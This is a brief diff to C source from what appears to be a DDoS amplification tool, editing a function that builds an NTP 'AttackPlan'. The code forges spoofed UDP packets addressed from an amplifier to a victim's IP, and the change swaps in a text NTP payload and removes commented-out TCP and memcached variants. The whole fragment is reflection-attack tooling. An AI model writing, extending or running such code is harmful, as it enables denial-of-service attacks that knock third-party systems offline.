@@ -43,10 +43,8 @@ static AttackPlan * createAttackDataNTP( LhfDraft *p_draft )
 
     memalloc( (void *)&newData, sizeof( AttackPlan ) );
     arg = NTP;
-    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
-    // newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
-    // arg = MEMCACHED_GET;
-    // newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
+    newData->setPacket = NULL;
+    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpText, &arg );
     newData->draft = p_draft;
     return newData;
 }
